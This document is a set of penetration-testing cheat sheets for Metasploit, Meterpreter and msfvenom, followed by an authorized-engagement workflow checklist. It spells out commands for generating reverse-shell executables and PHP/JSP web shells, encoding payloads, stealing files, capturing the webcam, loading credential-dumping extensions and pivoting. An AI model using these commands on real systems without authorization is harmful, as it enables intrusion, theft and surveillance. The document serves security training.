# Cheat Sheets

## 1. Metasploit (msfconsole) Cheat Sheet

| Task | Command |
|---|---|
| Check database connection | `db_status` |
| Initialize database | `sudo msfdb init` (run before launching msfconsole) |
| Create/switch workspace | `workspace -a <name>` / `workspace <name>` |
| List workspaces | `workspace` |
| Delete workspace | `workspace -d <name>` |
| Nmap scan into DB | `db_nmap -sV <target>` |
| Import external scan | `db_import <file.xml>` |
| List hosts | `hosts` |
| List services | `services` |
| List vulnerabilities | `vulns` |
| List credentials | `creds` |
| List loot | `loot` |
| Search modules | `search <term>` / `search type:exploit platform:windows` / `search cve:2007-2447` |
| Module info | `info <module/path>` |
| Use a module | `use <module/path>` |
| Show options | `show options` |
| Show targets | `show targets` |
| Show payloads | `show payloads` |
| Set option | `set <OPTION> <value>` |
| Run check (if supported) | `check` |
| Run exploit | `exploit` or `run` (foreground) / `exploit -j` (background) |
| List sessions | `sessions -l` |
| Interact with session | `sessions -i <id>` |
| Kill session | `sessions -k <id>` |
| Run resource script | `resource <file.rc>` or `msfconsole -r <file.rc>` |
| Run one-shot command string | `msfconsole -q -x "cmd1; cmd2; exit"` |
| Reload modules after edits | `reload_all` |
| Export database | `db_export -f xml <file.xml>` |

## 2. Meterpreter Cheat Sheet

| Task | Command |
|---|---|
| Basic system info | `sysinfo` |
| Current user context | `getuid` |
| List processes | `ps` |
| Current process ID | `getpid` |
| Migrate process | `migrate <PID>` |
| Drop to native shell | `shell` (then `exit` to return) |
| Print working directory | `pwd` |
| List remote directory | `ls` |
| Download file | `download <remote-path> <local-path>` |
| Upload file | `upload <local-path> <remote-path>` |
| Screenshot | `screenshot` |
| Webcam (where applicable) | `webcam_list` / `webcam_snap` |
| List privileges (Windows) | `getprivs` |
| Load extension | `load <extension>` (e.g., `load kiwi`) |
| Background session | `background` or `Ctrl+Z` |
| Add a route through this session | `run autoroute -s <subnet>/24` |
| Port forward | `portfwd add -l <local-port> -p <remote-port> -r <remote-ip>` |
| Upgrade shell to Meterpreter | `use post/multi/manage/shell_to_meterpreter` then `set SESSION <id>` → `run` |

## 3. MSFVenom Cheat Sheet

| Task | Command pattern |
|---|---|
| List payload formats | `msfvenom --list formats` |
| List encoders | `msfvenom --list encoders` |
| List payloads | `msfvenom --list payloads` |
| Generate Windows EXE Meterpreter | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe` |
| Generate Linux ELF Meterpreter | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf` |
| Generate PHP web shell | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php` |
| Generate JSP web shell | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp` |
| Exclude bad characters | add `-b '\x00\x0a\x0d'` |
| Apply an encoder | add `-e <encoder/path> -i <iterations>` |
| Use an existing template (binary) | add `-x <template-file> -k` |
| Generate raw shellcode for embedding | `-f raw -o shellcode.bin` |

## 4. Professional Workflow Checklist

- [ ] Workspace created and active for this engagement/lab
- [ ] Scope and rules of engagement confirmed (lab: confirm only intended targets are in your network)
- [ ] Host discovery + full port scan completed and logged to DB
- [ ] Service/version detection completed for every open port of interest
- [ ] Protocol-specific enumeration run where applicable (SMB/FTP/SSH/HTTP/SNMP)
- [ ] Candidate vulnerabilities matched to exact confirmed versions
- [ ] `check` run before `exploit` wherever supported
- [ ] Exploitation attempted only against verified-vulnerable services
- [ ] Session privilege/identity confirmed (`getuid`, `sysinfo`) immediately after landing
- [ ] Process migration considered for stability
- [ ] Privilege escalation enumeration run (`local_exploit_suggester` or equivalent)
- [ ] Any credential/hash collection handled and stored securely, scoped to authorization
- [ ] Pivoting/lateral movement only performed within explicitly authorized scope
- [ ] Evidence (screenshots, command logs, timestamps) captured continuously, not after the fact
- [ ] Findings written with risk rating, evidence reference, and remediation recommendation
- [ ] Executive summary written in plain business-risk language
- [ ] Any persistence/test artifacts fully removed and documented as removed (where applicable)
- [ ] Database exported / report finalized
